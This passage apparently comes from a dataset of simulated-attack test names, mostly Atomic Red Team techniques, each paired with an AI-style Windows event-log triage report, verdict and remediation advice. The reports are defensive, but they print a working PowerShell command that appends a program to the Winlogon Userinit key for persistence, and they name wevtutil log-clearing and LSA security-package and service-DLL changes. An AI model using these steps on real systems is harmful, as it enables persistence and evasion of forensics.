   - Check Azure environments for unauthorized changes linked to the script execution.

2. **Credential Security:**
   - Promptly manage and audit the use of scripts with hardcoded credentials. Replace any affected credentials immediately.
   
3. **Event Log Audits:**
   - Audit the system thoroughly; initiate a detailed review of past activities by `admin_test`.
   - Implement improved logging and monitoring setups to prevent future log tampering or unauthorized access attempts.

4. **Enhance Security Policies:**
   - Strengthen policies on PowerShell execution and user credential management. Implement Just-Enough-Administration (JEA) for PowerShell. 
   - Enforce more stringent audit logging for critical resources.

5. **User Awareness Training:**
   - Provide comprehensive training for users handling elevated privileges to ensure they follow the necessary protocols in maintaining system security and data integrity. 

Further investigative steps should focus on understanding the full context of the actions carried out in these logs to determine if any breach or policy violation has occurred. Depending on findings, reinforcement of these systems and policies will be necessary to mitigate future risks."
TinyTurla backdoor service w64time,"After analyzing the provided Windows event logs, I have identified a series of actions that strongly indicate malicious activity and potential compromise of the Windows machine involved. Here's a detailed breakdown of the findings:

1. **Clearing of Event Logs:**
   - **Security Log Cleared (EventID 1102):** The security event log was cleared by the user ""admin_test"" with the ""S-1-5-21-3962163828-2803415714-1403596700-1006"" SID. This is a red flag indicating an attempt to cover tracks after potentially malicious actions have been executed.
   - **System and PowerShell Logs Cleared (EventID 104):** Similarly, system and PowerShell channel logs were also cleared by the same user within a very short time frame. This suggests a concerted effort to hide unauthorized actions.

2. **Time Manipulation Events:**
   - There are two occurrences of time being set back as evidenced by EventID 4616 and the Kernel-General logs, often used to potentially bypass security mechanisms or to align log times for some operational reason under a malicious context.

3. **Suspicious Service Creation and Configuration:**
   - **Command Execution via Cmd.exe (EventID 1, Sysmon):** The command-line activity shows that a service named ""W64Time"" was created and configured with a non-standard image path and description, pointing to a potentially rogue DLL (`w64time.dll`). This is significant for its role in privilege escalation and maintaining persistence.
   - **Service Installation (EventID 7045):** Tied to the creation of the ""W64Time"" service, offering an indicator of potential backdoor installation leveraging the system's service management tools by ""admin_test"".

4. **Privileges Assigned:**
   - Elevated privileges were granted, as seen in EventID 4672 logs, including `SeDebugPrivilege` and others that could allow for significant access and manipulation capabilities.

5. **Use of High-Privilege Accounts:**
   - Multiple logons and logoffs (EventID 4624 and 4634) involving the same admin user over a short period, along with activities requiring elevated privileges, suggests unauthorized access plausibly initiated via compromised credentials.

6. **Execution of Potentially Malicious Commands:**
   - The events show the execution of tools such as `wevtutil.exe` to clear logs and `sc.exe` for service manipulation. Both are legitimate tools but used here in a potentially malicious context.

Given these observations, the situation indicates an ongoing compromise with an attempt to modify system configurations and maintain stealth through log clearing. The actions observed are characteristic of a system compromise involving privilege escalation, persistence mechanisms insertion, and antiforensic measures (e.g., log clearance).

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected system to prevent further lateral movement or data exfiltration.
- Conduct a forensic image acquisition of the compromised host to preserve evidence for further analysis.
- Perform a thorough analysis of unauthorized accesses and changes made within this server's timeframe.
- Reset passwords and perform a security audit on accounts with elevated privileges, particularly the ""admin_test"" account.
- Execute a full endpoint detection and response (EDR) sweep to identify any related artifacts across the network.
- Apply security patches and consider enhancing logging policies to cover any evasive strategies used by potential attackers."
Create shortcut to cmd in startup folders,"Upon preliminary analysis of the given logs from the Windows host (Server002), several key indicators of potentially malicious activity are apparent:

1. **Critical PowerShell Commands:**
   - There is evidence of a PowerShell script execution that is designed to create shortcuts to `cmd.exe` in startup directories with descriptions labeled ""T1547.009"". This behavior aligns with tactic and technique ID T1547.009, which falls under the MITRE ATT&CK category of Persistence via Shortcut Modification.
   - The script was executed using a PowerShell session, indicating someone may have attempted or succeeded in establishing persistence on the system.

2. **Event Log Clearing:**
   - There are several events (EventID 1102 from the Security log and EventID 104 from the System log) indicating that logs have been cleared by the user ""admin_test"". Clearing event logs is a common tactic used by attackers to cover their tracks after unauthorized access.

3. **Command Execution Analysis:**
   - The usage of `wevtutil.exe` to clear logs (as indicated by Event IDs of the process execution in the Sysmon logs) strengthens the assessment of malicious activity. This utility is known for management of logs and clearing them as part of anti-forensic measures.
   
4. **Integrity Levels and Users:**
   - The Sysmon logs indicate that `wevtutil.exe` and other critical executables were run under high integrity sessions by the user ""admin_test,"" indicating elevated permissions. This enhances the possibility of privilege escalation having been executed to achieve such permissions.

5. **Suspicious Edge Update Activity:**
   - Numerous `MicrosoftEdgeUpdate.exe` processes are seen executing with various command-line arguments. While these activities could be part of a legitimate update, the context of the other suspicious activities raises the concern about a potential attempt to masquerade this binary for malicious purposes.

Based on the analysis and the presence of several techniques associated with persistence, execution, anti-forensics, and potential privilege escalation, the activity recorded in the logs appears to be **MALICIOUS**. In a typical investigative scenario, such indicators warrant immediate containment protocols, further detailed forensic investigation, and reporting to incident response teams for deeper analysis of system integrity and scope of compromise.

**Recommended actions:**
- Isolate the affected system from the network to prevent further potential compromise.
- Initiate a comprehensive forensic analysis to ensure complete understanding and documentation of the breach.
- Review all user accounts, especially those with elevated privileges, and enforce or reset authentication measures.
- Check for any signs of data exfiltration or further malware deployment.
- Rebuild the affected system to a clean state from a known good backup, if necessary."
Edit an existing time provider,"### Detailed Analysis:

#### Suspicious or Anomalous Behavior:

- **Command-Line Usage & Operations:** 
  - The use of `wevtutil.exe` (Eventing Command Line Utility) to clear logs (commands include `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, and `cl Windows PowerShell`) is suspicious. Typically, attackers clear logs to cover their tracks.
  - **PowerShell Execution:**
    - A PowerShell script executed multiple registry modifications under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer` and copied a file (`AtomicTest.dll`) to the public directory (`C:\Users\Public\`). These actions are indicative of a potential persistence mechanism or malicious configuration change.
    - Notably, the script stopped and started the `w32time` service after making these changes, which could be an attempt to ensure the malicious configuration is loaded.

- **Process Activity:**
  - The execution of `reg.exe` to add registry entries related to `NtpServer` settings without clear documentation or expected administrative activity raises suspicion. These entries potentially modify how time synchronization works, possibly allowing malicious DLL injection via `AtomicTest.dll`.
  - The `Security` log file was cleared, as indicated by the EventID 1102, which suggests possible tampering or an attempt to hide malicious activity.
  - The execution of `svchost.exe` with potentially malicious arguments (`-k LocalService -s W32Time`) aligns with previously mentioned registry modifications, indicating misuse of legitimate processes to run unwanted configurations.

- **Executable Hashes:**
  - The hashes provided appear consistent for legitimate Windows processes in the context, except for cases involving potential tampering `AtomicTest.dll` and related `PowerShell` activity that need further investigation on file integrity and legitimacy.

#### Indicators of Malicious Activity:

- **The Use of `AtomicTest.dll`:** 
  - The interaction with `AtomicRedTeam` directories and usage of `AtomicTest.dll` suggests activities related to penetration testing or exploitation frameworks, which could be benign if authorized but is suspicious otherwise.

- **Clearing of Event Logs:** 
  - The intentional clearing of logs (`Security`, `System`, and `Windows PowerShell`) by a user `SERVER002\admin_test` is a common tactic to erase digital footprints and indicates unauthorized or malicious activity. 

- **Registry Modification Commands:**
  - Multiple registry changes involving time service providers (`NtpServer`) and referencing a new DLL raise concerns over potential backdoors or system compromise points.

#### Assessment:

Given the combination of these activities—especially the registry changes, file copying, and log clearing—along with the specific tools and command lines used, the evidence leans towards unauthorized, potentially malicious activity. The presence of known penetration testing or attack frameworks strengthens the assessment of intentional misuse or security policy breach.

### Conclusion:

**Resolution**: MALICIOUS

### Guidance on How to Proceed:

1. **Immediate Isolation**: Isolate the affected system to prevent further potential spread or exploitation.
2. **Review and Revert Changes**: Investigate the registry modifications and revert any unauthorized changes.
3. **File Integrity Check**: Validate the integrity of system files, especially time provider configurations and any DLLs involved.
4. **Conduct a Thorough Forensic Examination**: Examine any remaining traces, logs, or memory dumps for further signs of compromise.
5. **Threat Hunt**: Assess the network for similar activities or signs of lateral movement.
6. **Strengthen Security Posture**: Implement enhanced monitoring and stricter permissions for advanced tools like PowerShell and Sysmon.
7. **Incident Reporting**: Report findings according to internal and external (if applicable) incident reporting requirements.

This proactive approach will help in minimizing ongoing risks and securing the environment against immediate threats."
Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry,"## Analysis of Logs

### Identifying Key Indicators:
1. **Microsoft Edge Update Activity**:
   - Multiple processes related to `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe` are observed running with the user `NT AUTHORITY\SYSTEM`. This generally suggests legitimacy as a system-level update task.
   - The frequent execution of these binaries is typical for system updates and scheduled tasks, especially those managed by a system service.

2. **Suspicious PowerShell Activity**:
   - A specific command executed with PowerShell is noted: modifying the registry entry `HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig` to include a new DLL `AtomicTest.dll` into `Security Packages`.
   - PowerShell is a commonly abused tool in attacks for executing scripts and manipulating system settings clandestinely, and attempting to modify security packages is a significant red flag indicating potential privilege escalation or persistence mechanism setup.

3. **Event Logs Clearance**:
   - Windows Security, System, and Windows PowerShell logs being cleared by `admin_test`. This activity is suspect as it could be an attempt to erase tracks of potentially unauthorized changes or malicious activity.

4. **Time Change Events**:
   - Events showing system time adjustments (`EventID: 4616`) by `svchost.exe`. Although normal if coordinated with time servers, they are often monitored to ensure accuracy and should be assessed relative to other context, like authorization and source validity.

5. **Further Observations**:
   - Commands related to viewing logon information or system details (e.g., `whoami.exe`, `hostname.exe`) are logged but are typically not suspicious unless correlated with other indicators of compromise.

### Assessment:

#### Suspicious Behavior:
- The combination of unauthorized PowerShell registry modification, log clearing, and potentially obfuscated activity suggests a possible attempt to compromise security settings and persist unauthorized actions stealthily. 

#### Malicious Activity:
- Given the evidence of using PowerShell to alter security settings combined with log clearances, there are strong indicators of malicious activity. The PowerShell command suggests an attempt to introduce unauthorized dynamic-link libraries, which can facilitate numerous attack vectors, including credential theft or system backdoors.

### Resolution:
- **MALICIOUS**: These logs indicate malicious activity. The PowerShell execution modifying the `Security Packages` key and clearing of logs both strongly suggest an attempt at unauthorized access or persistent threat installation, warranting immediate incident response actions.

### Guidance and Next Steps:
1. **Immediate Network Response**:
   - Isolate the host (Server002) to prevent further lateral movement and potential data exfiltration.
   - Gather and preserve additional forensic data from the host for deeper analysis.
   
2. **Review and Revoke Credentials**:
   - Reset credentials associated with `admin_test` and evaluate access logs to determine the scope of potential credential compromise.

3. **Remediation**:
   - Reassess and restore registry changes to remove unauthorized `Security Packages`.
   - Conduct a full system integrity and malware scan to identify and remove any additional planted threats.

4. **Security Hardening**:
   - Implement strict PowerShell execution policies and enhanced logging.
   - Ensure endpoint detection and response tools are active and monitoring applied system-wide.

5. **Incident Coordination and Notification**:
   - Communicate with affected stakeholders about the security incident.
   - Coordinate with IT and security teams on next steps and ensure continuous monitoring of the network for related activity.

By addressing these points, the organization can mitigate current threats and strengthen security posture moving forward."
HKLM - Append Command to Winlogon Userinit KEY Value,"**Detailed Analysis of the Logs:**

1. **Log Clearing Events:**
   - The logs reveal multiple instances of the `wevtutil.exe` command being executed to clear various logs (`Sysmon`, `System`, `Security`, and `Windows PowerShell`). The `EventID 104` in the System log and `EventID 1102` in the Security log confirm the clearing of logs.
   - The clearing of logs, especially by a user account `admin_test`, often points towards an attempt to cover tracks after an action that could be malicious or unauthorized.

2. **Suspicious PowerShell Activity:**
   - In the PowerShell logs, the command execution modifies the registry at `HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon` to append `C:\Windows\System32\calc.exe` to the `Userinit` key. This modification is not typical for normal operations and suggests attempts to persist or execute a potentially unwanted program.
   - PowerShell Command:
     ```shell
     powershell.exe & {$oldvalue = $(Get-ItemPropertyValue -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit""); Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit-backup"" -Value ""$oldvalue""; $newvalue = $oldvalue + "" C:\Windows\System32\calc.exe""; Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit"" -Value ""$newvalue""}
     ```

3. **Process Execution Analysis:**
   - The Sysmon logs indicate that the `wevtutil.exe` tool was used repeatedly to clear specific logs. This tool is commonly used by attackers post-exploitation to hide evidence of their activity.
   - The use of `whoami.exe`, `whoami` typically identifies the active user, but when used alongside cover-up activities like log clearing, raises suspicion.
   - The log shows an initiated update or installation of Microsoft Edge, which is a legitimate system activity and indicates concurrent normal system operations.

4. **Potential Threats and Risks:**
   - The activity described, particularly the registry modification through PowerShell and the repeated log clearing with `wevtutil.exe`, suggests the potential for malicious intent. Such actions can indicate privilege escalation attempts and persistence mechanisms to maintain control over the system.
   - These actions could also expose the system to unauthorized use, leaks of sensitive data, or broader network attacks if part of larger exploitation schemes.

**Assessment of the Situation:**
- The logs provided contain strong indicators of potentially malicious activities. The sequence of log clearing, suspicious PowerShell usage for modifying the registry, and multiple instances of potentially sensitive process executions provide ample evidence of unauthorized or malicious undertakings.
- Therefore, the resolution based on the analysis of these logs is **MALICIOUS**.

**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Isolate the affected host (`Server002`) from the network to prevent further exfiltration or compromise.
   - Perform a detailed forensic analysis to gather more context around the suspicious activities detected.

2. **Remediation Steps:**
   - Revert any unauthorized changes (e.g., restore original `Userinit` registry values).
   - Clear the operating system of any additional threats by removing unauthorized software or malicious scripts.

3. **Monitoring & Response:**
   - Increase monitoring on relevant endpoints and network activities for further anomalies.
   - Conduct a thorough review of the accounts used (especially `admin_test`) to ensure integrity and security.

4. **Preventive Measures:**
   - Implement strict access control and regularly audit privileges of user accounts.
   - Deploy endpoint detection and response (EDR) solutions for real-time monitoring and isolation capabilities.
   - Conduct regular training for users to recognize and report suspicious activities."
Azure AD Application Hijacking - Service Principal,"Upon analyzing the provided Windows event logs, several indicators of potentially malicious activity stand out:

1. **Log File Clearing**: 
   - Events with ID 104 in the System log and Event ID 1102 in the Security log indicate that the logs were cleared. The use of `wevtutil.exe` to clear logs (as shown in the Sysmon logs, which captured various executions of `wevtutil.exe` clearing different logs) is suspicious, especially when combined with PowerShell activity. This behavior is often associated with attempts to cover tracks following malicious actions.

2. **Unusual PowerShell Activity**: 
   - The PowerShell logs show execution of a script that involves importing an AzureAD module, creating credentials, generating self-signed certificates, and connecting to AzureAD. It includes a warning about potential ""application hijacking"" which suggests the script might be a proof of concept or an attack simulation, likely related to ""Atomic Red Team"" tests. However, without confirmation of sanctioned testing, such script could also indicate a real attack attempt.

3. **Use of Test Elements**: 
   - Specifically, there are references to ""Atomic Red Team"" within the PowerShell command. Atomic Red Team is known for providing security tests to simulate attacks, suggesting this was potentially staged testing. However, without verification from IT or security teams that this is sanctioned activity, it should still be treated as suspect.

4. **High Integrity Level Execution**:
   - The `powershell.exe` and `wevtutil.exe` are executed with high integrity levels, indicating privileged execution. This combined with the log clearing activity raises a red flag for possible privilege misuse.

Given the above points, the situation warrants a cautious response. The clearing of system and security logs is particularly concerning, as it is a classic tactic used by threat actors to erase evidence. Additionally, the PowerShell activity, while potentially benign if this is indeed Atomic Red Team testing, requires verification from the organization.

**Resolution: SUSPICIOUS**

**Guidance**:
- Verify with the IT and security teams whether the PowerShell activity was approved testing or simulation.
- Investigate the user ""admin_test"" for any unauthorized access or anomaly, as this account is consistently seen performing these actions.
- Review and enhance logging policies to ensure that logclearing actions are monitored and alerting as potential security incidents.
- Consider performing a threat hunting session to check for any other indicators of compromise (IOC) on the system, and ensure the system is clean from any hidden malware or persistence mechanisms.
- If unauthorized, treat this as a potential security incident, isolate the affected systems, and conduct a full forensic analysis."
Creating Boot Verification Program Key for application execution during successful boot,"Upon analyzing the provided event logs from the Windows host, several key points indicate potential signs of suspicious activity:

1. **Log Clearance Activity**:
   - The logs show evidence of the `wevtutil.exe` command being used multiple times to clear event logs (`cl` is a shorthand for clearing logs) for the Application, System, and Security channels at the same timestamp. This includes the Windows PowerShell channel as well. Clearing event logs (Event ID 104 in system logs and Event ID 1102 in security logs) is a notorious method used by attackers to cover their tracks and hinder forensic investigations.

2. **User Activity**:
   - The logs show the operations were performed under the user `SERVER002\admin_test`. There is also evidence of administrative privileges being utilized (as indicated by the elevated integrity level and privileges like SeDebugPrivilege, SeRestorePrivilege, etc.).

3. **Command Execution**:
   - An entry showing the use of `cmd.exe` with a command to add a registry key for `BootVerificationProgram` executing `iexplore.exe`. This action could potentially be used to execute a payload upon system boot, which is a tactic used by attackers to establish persistence.

4. **Timestamp Manipulation**:
   - There are events related to time changes (`svchost.exe` changing system time), which could be an attempt to confuse logging or to manipulate timestamps of created files or logs to evade detection.

5. **Further Automated Activities**:
   - Various automated system processes related to Microsoft Edge Update were noted. While these processes themselves are not inherently suspicious, the timing and the surrounding activities make it crucial to verify these processes against regular scheduled maintenance tasks or known update windows to rule out masquerading.

Given these points, the overall assessment of the logs is as follows:

**Resolution: SUSPICIOUS**

The logs contain activities that strongly suggest the possibility of malicious behavior. While not all activities can be confirmed as malicious without further context or endpoint investigation, the combination of log clearing with elevated privileges and abnormal registry operations warrants a deeper investigation. Immediate action should involve:
- Restoring a backup (if available) to analyze previous logs for evidence.
- A thorough investigation of `admin_test` user's activities and credentials.
- Verifying all system processes administered by `admin_test` and conducting a security audit on their activities.
- Monitoring ongoing network and endpoint activity for similar patterns and anomalies.
- Implementing tighter access controls and logging mechanisms to prevent log tampering in the future."
